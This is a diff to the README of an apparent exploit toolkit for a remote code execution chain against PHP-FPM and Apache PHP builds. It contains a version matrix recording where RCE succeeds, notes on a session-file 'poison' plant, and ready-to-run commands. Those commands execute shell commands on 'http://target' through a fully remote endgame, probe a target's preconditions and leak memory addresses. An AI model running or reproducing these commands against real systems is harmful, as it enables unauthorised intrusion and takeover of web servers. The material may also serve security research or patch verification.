@@ -44,7 +44,7 @@ not match the profile.
 | PHP 8.1.33 FPM amd64 | php-8.1.33 source tarball (nginx+FPM) | `php-8.1.33-fpm` | http (stale string) | http (stale string) | **yes** | same chain; the stale struct is reclaimed from 7.4 on |
 | PHP 8.0.30 FPM amd64 | php-8.0.30 source tarball (nginx+FPM) | `php-8.0.30-fpm` | http (stale string) | http (stale string) | **yes** | same chain |
 | PHP 7.4.33 FPM amd64 | php-7.4.33 source tarball (nginx+FPM) | `php-7.4.33-fpm` | http (stale string) | http (stale string) | **yes** | same chain; `poison` also works |
-| PHP 7.2.34 FPM amd64 | php-7.2.34 source tarball (nginx+FPM) | `php-7.2.34-fpm` | no | no | no | arms the stale state; reclaim shape not found - `poison` plant |
+| PHP 7.2.34 FPM amd64 | php-7.2.34 source tarball (nginx+FPM) | — (plant only) | no | no | no | arms the stale state; reclaim shape not found; `poison` plant, no RCE profile |
 | PHP 8.4.25 aarch64 | `php:8.4.25-apache` | `php-8.4.25-bookworm-aarch64` | yes | yes | **yes** | probabilistic stage 3; retries |
 | PHP 8.5.0 aarch64 | `php:8.5.0-apache` | `php-8.5.0-bookworm` | yes | yes | no | stage-3 layout not found |
 | PHP 8.3.35 aarch64 | `php:8.3.35-apache` | `php-8.3.35-bookworm-aarch64` | yes | yes | no | stage-3 reference alive |
@@ -109,7 +109,7 @@ default retries because its stage 3 is probabilistic.
   the leak and reclaim geometry of any 7.4+ build over HTTP only;
   `poison` (the `session.upload_progress` session-file plant) covers 5.x and
   7.2; `php2shell_fpm_matrix.py` verifies the whole unpatched set in one run
-  and records the verdicts in `profiles/verification.json`. The `no-oracle`
+  and records the verdicts in `docs/calibration-logs/verification.json`. The `no-oracle`
   endgame is fully remote — no `/proc/<pid>/mem`, no local shell.
 - **PHP version registry** — `tools/php2shell_fpm_versions.py` is the single
   source of truth for the affected-version matrix: `is_vulnerable()`,
@@ -123,8 +123,10 @@ default retries because its stage 3 is probabilistic.
 
 ## Quick start
 
-Requirements: Python 3.11+, Docker (for the labs), Linux or macOS on arm64 or
-amd64. Fetch the pinned upstream:
+Requirements: Python 3.11+, Docker (for the Apache labs), Linux or macOS on
+arm64 or amd64. The Apache chain works on both; the PHP-FPM `endgame`/oracle
+needs Linux `/proc` (the `no-oracle` path does not), and the FPM build scripts
+fall back to `sysctl` when `nproc` is unavailable. Fetch the pinned upstream:
 
 ```sh
 python3 tools/bootstrap_upstream.py
@@ -211,10 +213,10 @@ python3 tools/php2shell_fpm.py \
 # memory_limit=128M, pm=dynamic x5 workers, stock php.ini (nginx needs
 # client_max_body_size >= 5m for the arm body)
 python3 tools/php2shell_fpm.py \
-  --base http://target --version 8.4.26 \
+  --base http://target --allow-remote --version 8.4.26 \
   --command 'id>out/p1' --proof-file out/p1 no-oracle
 # checklist: does this target meet every precondition of the chain?
-python3 tools/php2shell_fpm.py --base http://target --version 8.4.26 probe
+python3 tools/php2shell_fpm.py --base http://target --allow-remote --version 8.4.26 probe
 # print only the leaked bases
 python3 tools/php2shell_fpm.py \
   --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111 --version 8.4.26 leak
